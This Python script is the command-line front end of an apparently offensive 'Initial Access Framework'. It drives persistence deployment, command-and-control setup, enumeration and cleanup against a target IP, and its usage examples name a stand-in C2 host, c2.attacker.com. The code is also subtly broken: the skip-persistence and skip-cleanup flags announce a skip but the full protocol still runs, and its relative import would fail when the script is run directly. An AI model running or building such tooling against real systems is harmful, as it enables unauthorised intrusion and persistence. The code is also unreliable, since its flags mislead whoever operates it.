#!/usr/bin/env python3
"""
Initial Access Framework - Command Line Interface
Professional post-exploitation automation
"""

import argparse
import sys
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from ..initial_access_framework.initial_access_cli import InitialAccessHandler


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='Initial Access Framework - Automated post-exploitation workflow',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Run complete initial access protocol
  %(prog)s -t 10.10.10.50 -c c2.attacker.com
  
  # Specify target platform
  %(prog)s -t 192.168.1.100 -c c2.example.com --platform linux
  
  # Custom session name
  %(prog)s -t 10.0.0.5 -c c2.server.com --session "client-engagement-2024"

Operational Phases:
  1. Access Verification  (0-5 min)
  2. Persistence Deployment (5-10 min)
  3. C2 Establishment (10-15 min)
  4. Initial Enumeration (15-25 min)
  5. Cleanup Configuration (25-30 min)

⚠️  AUTHORIZED USE ONLY ⚠️
This tool is for authorized security testing only.
Unauthorized access to computer systems is illegal.
        '''
    )
    
    # Required arguments
    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target system IP address'
    )
    
    parser.add_argument(
        '-c', '--c2-server',
        required=True,
        help='Command and Control server address'
    )
    
    # Optional arguments
    parser.add_argument(
        '-p', '--platform',
        choices=['windows', 'linux'],
        default='windows',
        help='Target platform (default: windows)'
    )
    
    parser.add_argument(
        '-s', '--session',
        help='Custom session name (default: auto-generated)'
    )
    
    parser.add_argument(
        '--verify-only',
        action='store_true',
        help='Only verify access, do not perform full protocol'
    )
    
    parser.add_argument(
        '--skip-persistence',
        action='store_true',
        help='Skip persistence deployment phase'
    )
    
    parser.add_argument(
        '--skip-cleanup',
        action='store_true',
        help='Skip cleanup configuration phase'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )
    
    return parser.parse_args()


def main():
    """Main execution function"""
    args = parse_arguments()
    
    # Display banner
    print("""
╔═══════════════════════════════════════════════════════════╗
║        INITIAL ACCESS FRAMEWORK v1.0.0                    ║
║        Professional Post-Exploitation Automation          ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Validate inputs
    if not args.target or not args.c2_server:
        print("[!] Error: Target and C2 server are required")
        sys.exit(1)
    
    try:
        # Initialize handler
        handler = InitialAccessHandler(
            target_ip=args.target,
            c2_server=args.c2_server,
            platform=args.platform
        )
        
        # Override session name if provided
        if args.session:
            handler.session.session_id = args.session
        
        # Execute protocol based on flags
        if args.verify_only:
            print("\n[*] Running access verification only...")
            success = handler.verify_initial_access()
            if success:
                print("[✓] Access verification successful")
                sys.exit(0)
            else:
                print("[✗] Access verification failed")
                sys.exit(1)
        
        # Full protocol
        print("\n[*] Executing complete initial access protocol...")
        print(f"[*] This will take approximately 30 minutes\n")
        
        # Run phases with skip flags
        if args.skip_persistence:
            print("[*] Skipping persistence deployment phase")
        if args.skip_cleanup:
            print("[*] Skipping cleanup configuration phase")
        
        success = handler.execute_initial_access_protocol()
        
        if success:
            print("\n[✓] Initial access protocol completed successfully")
            
            # Display operation summary
            if args.verbose:
                print("\n" + "="*60)
                print("OPERATION SUMMARY")
                print("="*60)
                summary = handler.get_operation_summary()
                
                print(f"\nSession: {summary['session']['session_id']}")
                print(f"Duration: {summary['session']['elapsed_time']}")
                print(f"\nPersistence: {summary['persistence']['total_methods']} methods")
                print(f"C2 Channels: {summary['c2']['total_channels']} channels")
                print(f"Enumeration: {summary['enumeration']['total_commands']} commands")
                print(f"Cleanup: {summary['cleanup']['total_tasks']} tasks")
                print(f"Log Entries: {summary['log_entries']}")
            
            sys.exit(0)
        else:
            print("\n[✗] Initial access protocol encountered errors")
            sys.exit(1)
    
    except KeyboardInterrupt:
        print("\n\n[!] Operation interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Fatal error: {str(e)}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
